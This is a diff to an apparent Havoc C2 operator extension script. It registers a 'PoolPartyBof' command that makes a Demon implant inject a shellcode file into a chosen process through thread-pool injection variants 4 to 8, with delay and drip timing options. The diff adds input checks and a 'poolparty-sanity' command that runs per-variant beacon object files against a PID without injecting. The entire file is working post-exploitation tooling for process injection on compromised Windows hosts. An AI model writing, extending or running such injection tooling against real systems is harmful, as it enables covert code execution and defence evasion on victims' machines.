@@ -58,6 +58,10 @@ def PoolParty(demonID, *param):
         demon.ConsoleWrite(demon.CONSOLE_ERROR, "PID, variant, delay_sec, and drip_ms must be integers")
         return False
 
+    if pid <= 0:
+        demon.ConsoleWrite(demon.CONSOLE_ERROR, "Please enter a valid PID")
+        return False
+
     if delay < 0:
         demon.ConsoleWrite(demon.CONSOLE_ERROR, "delay_sec must be a non-negative integer")
         return False
@@ -76,7 +80,12 @@ def PoolParty(demonID, *param):
         demon.ConsoleWrite(demon.CONSOLE_ERROR, f"File containing shellcode not found: {shellcodeFile}")
         return False
 
-    Shellcode = open(shellcodeFile, 'rb').read()
+    try:
+        with open(shellcodeFile, "rb") as fh:
+            Shellcode = fh.read()
+    except OSError as exc:
+        demon.ConsoleWrite(demon.CONSOLE_ERROR, f"Failed to read shellcode: {exc}")
+        return False
     if len(Shellcode) == 0:
         demon.ConsoleWrite(demon.CONSOLE_ERROR, "Shellcode is empty.")
         return False
@@ -110,4 +119,48 @@ def PoolParty(demonID, *param):
     return TaskID
 
 
-RegisterCommand(PoolParty, "", "PoolPartyBof", "Thread-pool injection (v4-8). Prefer: 7 2 drip 50. Author: @an0nud4y", 0, "[PID] [/PATH/TO/SHELLCODE] [VARIANT] [DELAY_SEC] [drip [DRIP_MS]]", "1234 /tmp/shellcode.bin 7 2 drip 50")
+def PoolPartySanity(demonID, *param):
+    TaskID: str = None
+    demon: Demon = None
+    packer = Packer()
+
+    demon = Demon(demonID)
+
+    if len(param) != 2:
+        demon.ConsoleWrite(demon.CONSOLE_ERROR, "Usage: poolparty-sanity [pid] [variant]")
+        return False
+
+    try:
+        pid = int(param[0])
+        variant = int(param[1])
+    except ValueError:
+        demon.ConsoleWrite(demon.CONSOLE_ERROR, "PID and variant must be integers")
+        return False
+
+    if pid <= 0:
+        demon.ConsoleWrite(demon.CONSOLE_ERROR, "Please enter a valid PID")
+        return False
+
+    objectFile = ""
+    if variant == 4:
+        objectFile = "PoolPartyBof_V4.x64.o"
+    elif variant == 5:
+        objectFile = "PoolPartyBof_V5.x64.o"
+    elif variant == 6:
+        objectFile = "PoolPartyBof_V6.x64.o"
+    elif variant == 7:
+        objectFile = "PoolPartyBof_V7.x64.o"
+    elif variant == 8:
+        objectFile = "PoolPartyBof_V8.x64.o"
+    else:
+        demon.ConsoleWrite(demon.CONSOLE_ERROR, "Supply variant [4-8]")
+        return False
+
+    TaskID = demon.ConsoleWrite(demon.CONSOLE_TASK, f"Tasked demon to sanity-check PID {pid} variant {variant}.")
+    packer.addint(pid)
+    demon.InlineExecute(TaskID, "go", objectFile, packer.getbuffer(), False)
+    return TaskID
+
+
+RegisterCommand(PoolParty, "", "PoolPartyBof", "Thread-pool injection (v4-8). Does not sanity-check; run poolparty-sanity first if unsure. Prefer: 7 2 drip 50. Author: @an0nud4y", 0, "[PID] [/PATH/TO/SHELLCODE] [VARIANT] [DELAY_SEC] [drip [DRIP_MS]]", "1234 /tmp/shellcode.bin 7 2 drip 50")
+RegisterCommand(PoolPartySanity, "", "poolparty-sanity", "Query-only PoolParty check (no inject). Author: @an0nud4y", 0, "[PID] [VARIANT]", "1234 7")
